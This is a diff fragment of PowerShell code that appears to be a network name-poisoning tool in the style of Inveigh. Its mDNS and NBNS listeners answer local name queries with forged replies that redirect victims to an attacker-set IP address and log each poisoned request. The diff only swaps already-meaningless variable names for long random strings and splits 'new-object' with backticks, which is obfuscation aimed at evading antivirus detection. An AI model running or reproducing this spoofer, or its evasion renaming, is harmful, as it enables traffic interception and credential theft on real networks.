-            $BanSteel.Client.SetSocketOption("Socket", "ReuseAddress", $true)
-            $BanSteel.Client.Bind($WailWooden)
-            $ShrugWicked = [IPAddress]"224.0.0.251"
-            $BanSteel.JoinMulticastGroup($ShrugWicked)
-            $BanSteel.Client.ReceiveTimeout = 5000
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Close()
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.ExclusiveAddressUse = $false
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.Bind($nYMZHdUnuXpICGtawUkY)
+            $uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh = [IPAddress]"224.0.0.251"
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.JoinMulticastGroup($uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh)
+            $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.ReceiveTimeout = 5000
         }
 
-        if(([System.BitConverter]::ToString($SeaJuice)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($SeaJuice[4..11]) -eq "00-01-00-00-00-00-00-00")
+        if(([System.BitConverter]::ToString($fEBuPfpjTQUBaByUreqJmkOkgfJh)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($fEBuPfpjTQUBaByUreqJmkOkgfJh[4..11]) -eq "00-01-00-00-00-00-00-00")
         {
-            $StuffSky = $WailWooden.Address
-            $FuelMate = Get-NameQueryString 12 $SeaJuice
-            $ClubSave = ($FuelMate.Split("."))[0]
-            $FriendSquare = "[+]"
+            $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd = $nYMZHdUnuXpICGtawUkY.Address
+            $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV = Get-NameQueryString 12 $fEBuPfpjTQUBaByUreqJmkOkgfJh
+            $SFgDlEjoujEfnZASfFuMxSraXZULd = ($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Split("."))[0]
+            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = "[+]"
 
-            $CureGood = $SeaJuice[0,1] +
+            $lSwsJTeSgkncHgLrQneitzFlSMNMJC = $fEBuPfpjTQUBaByUreqJmkOkgfJh[0,1] +
                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                    $SeaJuice[12..($FuelMate.Length + 13)] +
+                                    $fEBuPfpjTQUBaByUreqJmkOkgfJh[12..($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Length + 13)] +
                                     0x00,0x01,0x00,0x01 +
-                                    $PourDesign +
+                                    $GdyRflIiJuuSiRDhkkCMfGiUyIqY +
                                     0x00,0x04 +
-                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
             
-            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QU" -GustyDance $BoilClever
-            $FriendSquare = $BabyFlap[0]
-            $BabyFlap = $BabyFlap[1]
+            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $SFgDlEjoujEfnZASfFuMxSraXZULd  -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "mDNS" -ZiaZppCfoomElDsdbkRCeNmpgGF "QU" -uemMcbPkfaIvvmaKKrSfGp $QdOGoORVrhoEArPgHPqrqy
+            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[0]
+            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[1]
 
-            if($BabyFlap -eq '[response sent]')
+            if($AefzCHMAvhxyPXkVdZDgykCWhRdXo -eq '[response sent]')
             {
-                $SlipChess = ne`w-`obje`ct Net.IPEndpoint($WailWooden.Address,$WailWooden.Port)
-                $BanSteel.Connect($SlipChess)
-                $BanSteel.Send($CureGood,$CureGood.Length)
-                $BanSteel.Close()
-                $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient
-                $BanSteel.ExclusiveAddressUse = $false
-                $BanSteel.Client.SetSocketOption("Socket", "ReuseAddress", $true)
-                $BanSteel.Client.Bind($WailWooden)
-                $ShrugWicked = [IPAddress]"224.0.0.251"
-                $BanSteel.JoinMulticastGroup($ShrugWicked)
-                $BanSteel.Client.ReceiveTimeout = 5000
+                $AoRsYSeqowZGWdrkicLuETmsgYemxxOGfivJk = ne`w`-`ob`je`ct Net.IPEndpoint($nYMZHdUnuXpICGtawUkY.Address,$nYMZHdUnuXpICGtawUkY.Port)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Connect($AoRsYSeqowZGWdrkicLuETmsgYemxxOGfivJk)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Send($lSwsJTeSgkncHgLrQneitzFlSMNMJC,$lSwsJTeSgkncHgLrQneitzFlSMNMJC.Length)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Close()
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.ExclusiveAddressUse = $false
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.Bind($nYMZHdUnuXpICGtawUkY)
+                $uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh = [IPAddress]"224.0.0.251"
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.JoinMulticastGroup($uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.ReceiveTimeout = 5000
             }
         
-            if($SeaJuice)
+            if($fEBuPfpjTQUBaByUreqJmkOkgfJh)
             {
-                $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QU) request $FuelMate received from $StuffSky $BabyFlap") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO [$(Get-Date -format s)] mDNS(QU) request $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $AefzCHMAvhxyPXkVdZDgykCWhRdXo") > $null
             }
 
-            $SeaJuice = $null
+            $fEBuPfpjTQUBaByUreqJmkOkgfJh = $null
         }
-        elseif(([System.BitConverter]::ToString($SeaJuice)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
-            $SeaJuice[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($SeaJuice[4..11]) -eq "00-02-00-00-00-00-00-00"))
+        elseif(([System.BitConverter]::ToString($fEBuPfpjTQUBaByUreqJmkOkgfJh)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
+            $fEBuPfpjTQUBaByUreqJmkOkgfJh[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($fEBuPfpjTQUBaByUreqJmkOkgfJh[4..11]) -eq "00-02-00-00-00-00-00-00"))
         {
-            $StuffSky = $WailWooden.Address
-            $FuelMate = Get-NameQueryString 12 $SeaJuice
-            $ClubSave = ($FuelMate.Split("."))[0]
-            $FriendSquare = "[+]"
+            $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd = $nYMZHdUnuXpICGtawUkY.Address
+            $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV = Get-NameQueryString 12 $fEBuPfpjTQUBaByUreqJmkOkgfJh
+            $SFgDlEjoujEfnZASfFuMxSraXZULd = ($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Split("."))[0]
+            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = "[+]"
 
-            $CureGood = $SeaJuice[0,1] +
+            $lSwsJTeSgkncHgLrQneitzFlSMNMJC = $fEBuPfpjTQUBaByUreqJmkOkgfJh[0,1] +
                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                    $SeaJuice[12..($FuelMate.Length + 13)] +
+                                    $fEBuPfpjTQUBaByUreqJmkOkgfJh[12..($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Length + 13)] +
                                     0x00,0x01,0x00,0x01 +
-                                    $PourDesign +
+                                    $GdyRflIiJuuSiRDhkkCMfGiUyIqY +
                                     0x00,0x04 +
-                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()        
+                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()        
                 
-            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QM" -GustyDance $BoilClever
-            $FriendSquare = $BabyFlap[0]
-            $BabyFlap = $BabyFlap[1]
+            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $SFgDlEjoujEfnZASfFuMxSraXZULd  -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "mDNS" -ZiaZppCfoomElDsdbkRCeNmpgGF "QM" -uemMcbPkfaIvvmaKKrSfGp $QdOGoORVrhoEArPgHPqrqy
+            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[0]
+            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[1]
 
-            if($BabyFlap -eq '[response sent]')
+            if($AefzCHMAvhxyPXkVdZDgykCWhRdXo -eq '[response sent]')
             {
-                $SlipChess = ne`w-`obje`ct Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
-                $BanSteel.Connect($SlipChess)
-                $BanSteel.Send($CureGood,$CureGood.Length)
-                $BanSteel.Close()
-                $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient 5353
-                $ShrugWicked = [IPAddress]"224.0.0.251"
-                $BanSteel.JoinMulticastGroup($ShrugWicked)
-                $BanSteel.Client.ReceiveTimeout = 5000
+                $AoRsYSeqowZGWdrkicLuETmsgYemxxOGfivJk = ne`w`-`ob`je`ct Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Connect($AoRsYSeqowZGWdrkicLuETmsgYemxxOGfivJk)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Send($lSwsJTeSgkncHgLrQneitzFlSMNMJC,$lSwsJTeSgkncHgLrQneitzFlSMNMJC.Length)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Close()
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 5353
+                $uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh = [IPAddress]"224.0.0.251"
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.JoinMulticastGroup($uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh)
+                $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.ReceiveTimeout = 5000
             }
 
-            if($SeaJuice)                   
+            if($fEBuPfpjTQUBaByUreqJmkOkgfJh)                   
             {
-                $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QM) request $FuelMate received from $StuffSky $BabyFlap") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO [$(Get-Date -format s)] mDNS(QM) request $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $AefzCHMAvhxyPXkVdZDgykCWhRdXo") > $null
             }
 
-            $SeaJuice = $null
+            $fEBuPfpjTQUBaByUreqJmkOkgfJh = $null
         }
 
     }
 
-    $BanSteel.Close()
+    $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Close()
 }
 
 # Microsoft".
-$YokeInjure = 
+$HKLlyGSEjLdPNnglCuAMTnVKGAJWthQ = 
 {
-    param ($MeekSmoggy,$SmashDolls,$BlushCattle,$ThawMiddle,$StickLame,$HoleRoute,$BikeLoud,
-        $ObeyAttack,$WoozyClose,$JokeFaulty)
+    param ($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn,$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS,$fgjekbNhYQKGsQdqOkUhuYvojUQK,$XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ,$zkTvnUBoWamaHbrMDvklWqGBdwC,$fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo,$EPlJedBuToZfupQVQRyNJcsGRdsiyc,
+        $GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg,$swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe,$iNyWtiQGdKJEvnLZUaOj)
 
-    $OneStop = $true
-    $CactusSilver = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
+    $jvvplwsctnKyEQESWFMyqfBTAmeNiYTEhwEKoXkOgFzaJ = $true
+    $bnfvGRVHpVzDMzBsvbPJsxpHqwLkGLtYWsBTFMwwOh = ne`w`-`ob`je`ct System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
 
     try
     {
-        $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
+        $jWdfmbdepWlSyuBmlkkKlMuAhQsF = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 137
     }
     catch
     {
-        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
         $error_message = $_.Exception.Message
         $error_message = $error_message -replace "`n",""
-        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-        $OneStop = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $jvvplwsctnKyEQESWFMyqfBTAmeNiYTEhwEKoXkOgFzaJ = $false
     }
 
-    $HollowSquash.Client.ReceiveTimeout = 5000
-    $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
-    [Array]::Reverse($BaitWound)
+    $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Client.ReceiveTimeout = 5000
+    $PqfBMFnJtCcQXwIFXnfncaQHK = [System.BitConverter]::GetBytes($fgjekbNhYQKGsQdqOkUhuYvojUQK)
+    [Array]::Reverse($PqfBMFnJtCcQXwIFXnfncaQHK)
 
-    while($LightOval.running -and $OneStop)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $jvvplwsctnKyEQESWFMyqfBTAmeNiYTEhwEKoXkOgFzaJ)
     {
         
         try
         {
-            $TugUntidy = $HollowSquash.Receive([Ref]$CactusSilver)
+            $DluYVvTEDMnnhrflTrcyQzEl = $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Receive([Ref]$bnfvGRVHpVzDMzBsvbPJsxpHqwLkGLtYWsBTFMwwOh)
         }
         catch
         {
-            $HollowSquash.Close()
-            $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
-            $HollowSquash.Client.ReceiveTimeout = 5000
+            $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Close()
+            $jWdfmbdepWlSyuBmlkkKlMuAhQsF = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 137
+            $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Client.ReceiveTimeout = 5000
         }
 
-        if($TugUntidy -and [System.BitConverter]::ToString($TugUntidy[10..11]) -ne '00-01')
+        if($DluYVvTEDMnnhrflTrcyQzEl -and [System.BitConverter]::ToString($DluYVvTEDMnnhrflTrcyQzEl[10..11]) -ne '00-01')
         {
-            $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
-            [Array]::Reverse($BaitWound)
+            $PqfBMFnJtCcQXwIFXnfncaQHK = [System.BitConverter]::GetBytes($fgjekbNhYQKGsQdqOkUhuYvojUQK)
+            [Array]::Reverse($PqfBMFnJtCcQXwIFXnfncaQHK)
 
-            $KindChess = $TugUntidy[0,1] +
+            $wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka = $DluYVvTEDMnnhrflTrcyQzEl[0,1] +
                                     0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
-                                    $TugUntidy[13..$TugUntidy.Length] +
-                                    $BaitWound +
+                                    $DluYVvTEDMnnhrflTrcyQzEl[13..$DluYVvTEDMnnhrflTrcyQzEl.Length] +
+                                    $PqfBMFnJtCcQXwIFXnfncaQHK +
                                     0x00,0x06,0x00,0x00 +
-                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes() +
+                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes() +
                                     0x00,0x00,0x00,0x00
 
-            $StuffSky = $CactusSilver.Address
-            $HealthIcy = [System.BitConverter]::ToString($TugUntidy[43..44])
-            $HealthIcy = Get-NeedleSoak $HealthIcy
-            $ScarceSlow = $TugUntidy[47]
-            $GaudyArgue = "[+]"
-            $RhymeTaste = [System.BitConverter]::ToString($TugUntidy[13..($TugUntidy.Length - 4)])
-            $RhymeTaste = $RhymeTaste -replace "-00",""
-            $RhymeTaste = $RhymeTaste.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-            $UltraFail = ne`w-`obje`ct System.String ($RhymeTaste,0,$RhymeTaste.Length)
-            $SkinInnate = $UltraFail
-            $UltraFail = $UltraFail.Substring(0,$UltraFail.IndexOf("CA"))
-            $WiseWool = $null
-            $DuckElbow = $null
-            $PluckyIce = 0
+            $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd = $bnfvGRVHpVzDMzBsvbPJsxpHqwLkGLtYWsBTFMwwOh.Address
+            $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = [System.BitConverter]::ToString($DluYVvTEDMnnhrflTrcyQzEl[43..44])
+            $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = Get-ZsFNylZKZDXPRaRNjAMJ $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF
+            $qfDybhrCkogeqBSwRgeuSRiXLZmeRXhUqAISlpNki = $DluYVvTEDMnnhrflTrcyQzEl[47]
+            $qyAKyUBoHQSWEjgZQNhhBSPwENPcNqgfgajXBFkZuRr = "[+]"
+            $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO = [System.BitConverter]::ToString($DluYVvTEDMnnhrflTrcyQzEl[13..($DluYVvTEDMnnhrflTrcyQzEl.Length - 4)])
+            $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO = $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO -replace "-00",""
+            $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO = $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $iDwGmwnIkCppXduPLWlGifXN = ne`w`-`ob`je`ct System.String ($yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO,0,$yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO.Length)
+            $AIkaRhGeeUBTdokOmzrRKhnfsreokC = $iDwGmwnIkCppXduPLWlGifXN
+            $iDwGmwnIkCppXduPLWlGifXN = $iDwGmwnIkCppXduPLWlGifXN.Substring(0,$iDwGmwnIkCppXduPLWlGifXN.IndexOf("CA"))
+            $aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM = $null
+            $JTeZBpXbOmozzaXsfaVV = $null
+            $hQbHauzqGbiFGbiOXwzJJKmp = 0
                             
             do
             {
-                $UntidyCake = (([Byte][Char]($UltraFail.Substring($PluckyIce,1))) - 65)
-                $WiseWool += ([System.Convert]::ToString($UntidyCake,16))
-                $PluckyIce += 1
+                $gTRmtuFxBIuvCgSWNqtgoUIsPvprrWcAkue = (([Byte][Char]($iDwGmwnIkCppXduPLWlGifXN.Substring($hQbHauzqGbiFGbiOXwzJJKmp,1))) - 65)
+                $aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM += ([System.Convert]::ToString($gTRmtuFxBIuvCgSWNqtgoUIsPvprrWcAkue,16))
+                $hQbHauzqGbiFGbiOXwzJJKmp += 1
             }
-            until($PluckyIce -ge ($UltraFail.Length))
+            until($hQbHauzqGbiFGbiOXwzJJKmp -ge ($iDwGmwnIkCppXduPLWlGifXN.Length))
                     
-            $PluckyIce = 0
+            $hQbHauzqGbiFGbiOXwzJJKmp = 0
                     
             do
             {
-                $DuckElbow += ([Char]([System.Convert]::ToInt16($WiseWool.Substring($PluckyIce,2),16)))
-                $PluckyIce += 2
+                $JTeZBpXbOmozzaXsfaVV += ([Char]([System.Convert]::ToInt16($aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM.Substring($hQbHauzqGbiFGbiOXwzJJKmp,2),16)))
+                $hQbHauzqGbiFGbiOXwzJJKmp += 2
             }
-            until($PluckyIce -ge ($WiseWool.Length) -or $DuckElbow.Length -eq 15)
+            until($hQbHauzqGbiFGbiOXwzJJKmp -ge ($aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM.Length) -or $JTeZBpXbOmozzaXsfaVV.Length -eq 15)
 
-            if($SkinInnate.StartsWith("ABAC") -and $SkinInnate.EndsWith("ACAB"))
+            if($AIkaRhGeeUBTdokOmzrRKhnfsreokC.StartsWith("ABAC") -and $AIkaRhGeeUBTdokOmzrRKhnfsreokC.EndsWith("ACAB"))
             {
-                $DuckElbow = $DuckElbow.Substring(2)
-                $DuckElbow = $DuckElbow.Substring(0, $DuckElbow.Length - 1)
-                $DuckElbow = "<01><02>" + $DuckElbow + "<02>"
+                $JTeZBpXbOmozzaXsfaVV = $JTeZBpXbOmozzaXsfaVV.Substring(2)
+                $JTeZBpXbOmozzaXsfaVV = $JTeZBpXbOmozzaXsfaVV.Substring(0, $JTeZBpXbOmozzaXsfaVV.Length - 1)
+                $JTeZBpXbOmozzaXsfaVV = "<01><02>" + $JTeZBpXbOmozzaXsfaVV + "<02>"
             }
 
-            if($DuckElbow -notmatch '[^\x00-\x7F]+')
+            if($JTeZBpXbOmozzaXsfaVV -notmatch '[^\x00-\x7F]+')
             {
 
-                if(!$LightOval.request_table.ContainsKey($DuckElbow))
+                if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.ContainsKey($JTeZBpXbOmozzaXsfaVV))
                 {
-                    $LightOval.request_table.Add($DuckElbow.ToLower(),[Array]$StuffSky.IPAddressToString)
-                    $LightOval.request_table_updated = $true
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.Add($JTeZBpXbOmozzaXsfaVV.ToLower(),[Array]$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString)
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
                 }
                 else
                 {
-                    $LightOval.request_table.$DuckElbow += $StuffSky.IPAddressToString
-                    $LightOval.request_table_updated = $true
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$JTeZBpXbOmozzaXsfaVV += $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
                 }
 
             }
             
-            $TidyIron = Get-SpooferResponseMessage -ExpectRitzy $DuckElbow -EarBucket "NBNS" -GustyDance $PeckFirst -PiesDesk $ScarceSlow
-            $GaudyArgue = $TidyIron[0]
-            $TidyIron = $TidyIron[1]
+            $KeVSBneOSgjHTUHPjXtwZCs = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $JTeZBpXbOmozzaXsfaVV -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "NBNS" -uemMcbPkfaIvvmaKKrSfGp $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -GrSMnlUYOpxqPmnvgxksnOntoUntTCzEea $qfDybhrCkogeqBSwRgeuSRiXLZmeRXhUqAISlpNki
+            $qyAKyUBoHQSWEjgZQNhhBSPwENPcNqgfgajXBFkZuRr = $KeVSBneOSgjHTUHPjXtwZCs[0]
+            $KeVSBneOSgjHTUHPjXtwZCs = $KeVSBneOSgjHTUHPjXtwZCs[1]
 
-            if($TidyIron -eq '[response sent]')
+            if($KeVSBneOSgjHTUHPjXtwZCs -eq '[response sent]')
             {
-                $EndGuitar = ne`w-`obje`ct System.Net.IPEndpoint($CactusSilver.Address,$CactusSilver.Port)
-                $HollowSquash.Connect($EndGuitar)
-                $HollowSquash.Send($KindChess,$KindChess.Length)
-                $HollowSquash.Close()
-                $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
-                $HollowSquash.Client.ReceiveTimeout = 5000
+                $fqdYtnZGiJLtKxFaCbuVxcPHmTBJYqBVHwlgq = ne`w`-`ob`je`ct System.Net.IPEndpoint($bnfvGRVHpVzDMzBsvbPJsxpHqwLkGLtYWsBTFMwwOh.Address,$bnfvGRVHpVzDMzBsvbPJsxpHqwLkGLtYWsBTFMwwOh.Port)
+                $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Connect($fqdYtnZGiJLtKxFaCbuVxcPHmTBJYqBVHwlgq)
+                $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Send($wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka,$wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka.Length)
+                $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Close()
+                $jWdfmbdepWlSyuBmlkkKlMuAhQsF = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 137
+                $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Client.ReceiveTimeout = 5000
             }
 
-            if($TugUntidy)                   
+            if($DluYVvTEDMnnhrflTrcyQzEl)                   
             {
-                $LightOval.output_queue.Add("$GaudyArgue [$(Get-Date -format s)] NBNS request $DuckElbow<$HealthIcy> received from $StuffSky $TidyIron") > $null    
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$qyAKyUBoHQSWEjgZQNhhBSPwENPcNqgfgajXBFkZuRr [$(Get-Date -format s)] NBNS request $JTeZBpXbOmozzaXsfaVV<$VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF> received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $KeVSBneOSgjHTUHPjXtwZCs") > $null    
             }
 
-            $TugUntidy = $null
+            $DluYVvTEDMnnhrflTrcyQzEl = $null
         }
 
     }
 
-    $HollowSquash.Close()
+    $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Close()
  }
 
 # Microsoft".
-$KickWord = 
+$ZrWvpgCNDBwDMqOVLwwyN = 
 {
-    param ($DelayValue,$MournMean,$NorthLumpy,$BlushCattle,$StickLame)
+    param ($WfbavDNzjNgDFDUYWZEYjga,$NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu,$deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP,$fgjekbNhYQKGsQdqOkUhuYvojUQK,$zkTvnUBoWamaHbrMDvklWqGBdwC)
    
-    $DelayValue = $DelayValue.ToUpper()
+    $WfbavDNzjNgDFDUYWZEYjga = $WfbavDNzjNgDFDUYWZEYjga.ToUpper()
 
-    $HillHappen = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
+    $yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                         0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00
 
-    $OilSilk = [System.Text.Encoding]::UTF8.GetBytes($DelayValue)
-    $OilSilk = [System.BitConverter]::ToString($OilSilk)
-    $OilSilk = $OilSilk.Replace("-","")
